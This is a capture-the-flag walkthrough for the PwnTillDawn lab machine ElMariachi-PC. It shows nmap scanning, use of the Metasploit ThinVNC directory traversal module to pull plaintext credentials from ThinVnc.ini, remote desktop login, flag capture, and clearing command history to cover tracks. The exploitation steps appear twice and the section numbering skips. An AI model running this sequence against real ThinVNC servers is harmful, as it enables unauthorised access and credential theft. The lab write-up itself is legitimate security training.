# PwnTillDwn Walkthrough ElMariachi PC

## Target Profile
* **Hostname: ElMariachi-PC** 
* **IP Address: 10.150.150.69**
* **Operating System: Windows** 
* **Objective: Retrieve FLAG67**

## 1. Reconnaissance
Initial intelligence gathering on the PwnTillDawn platform identified the target machine as a Windows system named `ElMariachi-PC` at the IP address `10.150.150.69`. The machine was listed with an "Active" status.

## 2. Scanning
To map the attack surface, the scanning phase was divided into broad host discovery and targeted service enumeration.

Host Discovery: First, a ping sweep was executed across the subnet to identify live hosts without aggressively scanning ports.

* Command: nmap -sn 10.150.150.0/24

* Result: This confirmed the presence of active machines on the network and verified our specific target, 10.150.150.69, was reachable.

Service Enumeration: Once the target was confirmed, a comprehensive port scan was executed to identify running services and potential entry points.

**Command** :

```bash
nmap -sC -sV -p- 10.150.150.69
```

**Key Findings** :

The scan completed in 762.16 seconds and discovered multiple open TCP ports :

  * `135/tcp` (msrpc)
  * `139/tcp` (netbios-ssn)
  * `445/tcp` (microsoft-ds)
  * `3389/tcp` (ms-wbt-server / Microsoft Terminal Services)
  * `60000/tcp` (unknown service initially)

**Vulnerability Identification** : 

* While ports 135-3389 are standard Windows services, port `60000` returned unique HTTP fingerprint data. The Nmap NSE scripts revealed an HTTP 401 Access Denied response that exposed a Digest realm specifically for `"ThinVNC"`. This indicated a ThinVNC web server was running on a non-standard port.

## 3. Gaining Access
With the ThinVNC service identified on port 60000, the Metasploit Framework was utilized to search for and exploit known vulnerabilities associated with this software.

**Exploitation Steps** :
  1. Searched for ThinVNC modules: `search ThinVNC`
  2. Selected the directory traversal vulnerability module: use 0 (which corresponds to auxiliary/scanner/http/thinvnc_traversal).
  3. Configured the target parameters:
     * set RHOST 10.150.150.69
     * set RPORT 60000
  4.  Executed the attack: `exploit`

**Exploit Results** : The path traversal attack successfully read the `ThinVnc.ini` file and extracted plain-text credentials.
  *  Extracted Username: `desperado`
  *  Extracted Password: `TooComplicatedToGuessMeAhahahahahahahh`

**System Compromise** : 
  1. Navigated a web browser to the ThinVNC portal at `http://10.150.150.69:60000`.
  2. Authenticated using the extracted credentials for the user `desperado`.
  3. Accessed the ThinVNC remote desktop interface .
  4. Navigated the remote Windows desktop to locate the target file and extracted the flag hash: `257121d50fa290b1337eadeef9ba255a61633562`.
  5. The flag was successfully submitted on the PwnTillDawn platform to compromise the box.







* Launched Metasploit framework using `msfconsole`.
* Searched for ThinVNC exploits: `search ThinVNC`.
* Selected the directory traversal module: `use auxiliary/scanner/http/thinvnc_traversal`.
* Configured the module options:
  * `set RHOST 10.150.150.69`
  * `set RPORT 60000`
* Executed the exploit: `exploit`.
* The exploit successfully extracted credentials from the `ThinVnc.ini` file.
  * Username: `desperado`
  * Password: `TooComplicatedToGuessMeAhahahahahahahh`
* Navigated to the web interface at `http://10.150.150.69:60000` and authenticated with the discovered credentials.
* Gained full remote desktop access via the ThinVNC web portal.
* Located the target flag (`FLAG67`) on the system and successfully submitted it to the PwnTillDawn dashboard.

##  6. Clear Tracks
To adhere to post-exploitation best practices and clean up the local attacker environment, the operational history within the Metasploit Framework was purged.

*  Command: history -c

*  Result: Metasploit confirmed [+] Command history and history file cleared, ensuring that sensitive commands, IPs, and methodologies used during the session were removed from the local logs.
